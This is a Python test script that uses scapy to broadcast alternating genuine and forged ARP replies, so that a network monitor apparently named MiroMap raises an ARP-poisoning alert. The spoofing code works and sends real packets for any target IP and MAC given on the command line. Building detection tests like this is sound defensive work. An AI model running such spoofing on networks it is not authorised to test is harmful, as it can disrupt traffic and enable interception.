#!/usr/bin/env python3
"""
Test script to simulate ARP poisoning for MiroMap testing
This will send fake ARP packets to trigger the security detection
"""
import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether
import time
import sys

def simulate_arp_poisoning(target_ip, fake_mac, real_mac, interface='eth0'):
    """
    Simulate ARP poisoning by sending conflicting ARP responses
    
    Args:
        target_ip: IP address to spoof
        fake_mac: Attacker's MAC address
        real_mac: Legitimate device's MAC address
        interface: Network interface to use
    """
    print(f"🧪 Simulating ARP Poisoning Attack")
    print(f"   Target IP: {target_ip}")
    print(f"   Fake MAC: {fake_mac}")
    print(f"   Real MAC: {real_mac}")
    print(f"   Interface: {interface}\n")
    
    # Send legitimate ARP response first
    print("1. Sending legitimate ARP response...")
    arp_real = ARP(op=2, psrc=target_ip, hwsrc=real_mac, pdst='192.168.1.255')
    ether_real = Ether(dst='ff:ff:ff:ff:ff:ff')
    packet_real = ether_real / arp_real
    scapy.sendp(packet_real, iface=interface, verbose=False)
    time.sleep(2)
    
    # Send fake ARP response (ARP poisoning)
    print("2. Sending FAKE ARP response (simulating attack)...")
    arp_fake = ARP(op=2, psrc=target_ip, hwsrc=fake_mac, pdst='192.168.1.255')
    ether_fake = Ether(dst='ff:ff:ff:ff:ff:ff')
    packet_fake = ether_fake / arp_fake
    scapy.sendp(packet_fake, iface=interface, verbose=False)
    time.sleep(2)
    
    # Send another legitimate response
    print("3. Sending another legitimate ARP response...")
    scapy.sendp(packet_real, iface=interface, verbose=False)
    time.sleep(1)
    
    # Send another fake response
    print("4. Sending another FAKE ARP response...")
    scapy.sendp(packet_fake, iface=interface, verbose=False)
    
    print("\n✅ ARP poisoning simulation complete!")
    print("   Check MiroMap for security alerts\n")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: sudo python3 test_arp_poisoning.py <target_ip> <fake_mac> <real_mac> [interface]")
        print("\nExample:")
        print("  sudo python3 test_arp_poisoning.py 192.168.1.1 aa:bb:cc:dd:ee:ff 00:11:22:33:44:55 eth0")
        print("\nNote: This requires root/sudo privileges")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    fake_mac = sys.argv[2]
    real_mac = sys.argv[3]
    interface = sys.argv[4] if len(sys.argv) > 4 else 'eth0'
    
    try:
        simulate_arp_poisoning(target_ip, fake_mac, real_mac, interface)
    except PermissionError:
        print("❌ Error: This script requires root privileges")
        print("   Run with: sudo python3 test_arp_poisoning.py ...")
        sys.exit(1)
    except Exception as e:
        print(f"❌ Error: {e}")
        sys.exit(1)
